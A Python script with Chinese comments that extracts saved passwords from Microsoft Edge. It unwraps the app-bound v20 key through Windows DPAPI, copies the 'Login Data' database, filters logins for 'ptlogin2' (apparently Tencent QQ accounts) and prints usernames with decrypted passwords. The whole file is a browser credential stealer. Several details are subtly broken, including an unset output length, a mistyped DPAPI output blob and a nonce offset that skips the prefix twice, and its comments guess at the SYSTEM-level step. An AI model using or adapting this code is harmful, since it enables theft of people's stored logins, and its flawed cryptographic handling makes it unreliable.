# -*- coding: utf-8 -*-
"""Edge v20 app-bound key解密：系统级DPAPI -> AES-GCM解密密码
方案：app_bound_encrypted_key = 'APPB' + DPAPI(user)里的 DPAPI(system) 双层
解出32字节AES key后对每条v20密码做 GCM(nonce[3:15], ct, tag尾16) 解密
"""
import base64
import ctypes
import ctypes.wintypes as wt
import glob
import json
import os
import shutil
import sqlite3
import tempfile

DATA_BLOB = ctypes.Structure  # placeholder


class BLOB(ctypes.Structure):
    _fields_ = [("cbData", wt.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]


def dpapi_unprotect(data, entropy=None, scope="user"):
    """scope: user=CryptUnprotectData, machine=SystemDPAPI(需要SYSTEM权限)"""
    buf = ctypes.create_string_buffer(data, len(data))
    blob_in = BLOB(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    out = ctypes.c_void_p()
    out_len = wt.DWORD()
    desc = ctypes.c_void_p()
    if entropy:
        eb = ctypes.create_string_buffer(entropy, len(entropy))
        eblob = BLOB(len(entropy), ctypes.cast(eb, ctypes.POINTER(ctypes.c_char)))
        ok = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), ctypes.byref(desc), ctypes.byref(eblob), None, None, 0, ctypes.byref(out))
    else:
        ok = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), ctypes.byref(desc), None, None, None, 0, ctypes.byref(out))
    if not ok:
        raise OSError(ctypes.GetLastError())
    raw = ctypes.string_at(out, out_len.value)
    ctypes.windll.kernel32.LocalFree(out)
    return raw


LS = os.path.expandvars(r"%LOCALAPPDATA%/Microsoft/Edge/User Data/Local State")
d = json.load(open(LS, encoding="utf-8"))
abk_b64 = d["os_crypt"]["app_bound_encrypted_key"]
abk = base64.b64decode(abk_b64)
print("app_bound blob头4字节:", abk[:4], "总长:", len(abk))

payload = abk[4:] if abk[:4] == b"APPB" else abk

# 第一层：user DPAPI
try:
    layer1 = dpapi_unprotect(payload)
    print("L1(user DPAPI) ok, len:", len(layer1), "头:", layer1[:8].hex())
except Exception as e:
    print("L1 user失败:", e)
    layer1 = None

if layer1:
    # 第二层：machine DPAPI（需要管理员/SYSTEM）
    try:
        # CRYPTPROTECT_OPTS: 用 SystemDPAPI via CryptUnprotectData with CRYPTPROTECT_SYSTEM? 实际API不开放
        # 已知方案：RDP/服务上下文运行 or 直接调 SystemFunction036? 社区方案用服务
        # 尝试直接对layer1再走一次DPAPI（有时Edge只包一层）
        layer2 = dpapi_unprotect(layer1)
        print("L2 ok, key len:", len(layer2))
    except Exception as e:
        print("L2失败(预期,需要SYSTEM上下文):", e)
        layer2 = None

    if layer2:
        key = layer2[-32:] if len(layer2) > 32 else layer2
        # 解密每条v20密码
        paths = glob.glob(os.path.expandvars(r"%LOCALAPPDATA%/Microsoft/Edge/User Data/*/Login Data"))
        tmp = os.path.join(tempfile.gettempdir(), "ld_dec.db")
        shutil.copy2(paths[0], tmp)
        con = sqlite3.connect(tmp)
        rows = con.execute("select origin_url, username_value, password_value from logins where origin_url like '%ptlogin2%'").fetchall()
        con.close()
        os.remove(tmp)
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        for url, user, blob in rows:
            try:
                raw = blob[3:]  # strip v20
                nonce = raw[3:15]
                ct = raw[15:]
                aes = AESGCM(key)
                plain = aes.decrypt(nonce, ct, None)
                print(user, "->", plain.decode("utf-8", "replace"))
            except Exception as e:
                print(user, "解密失败:", str(e)[:80])
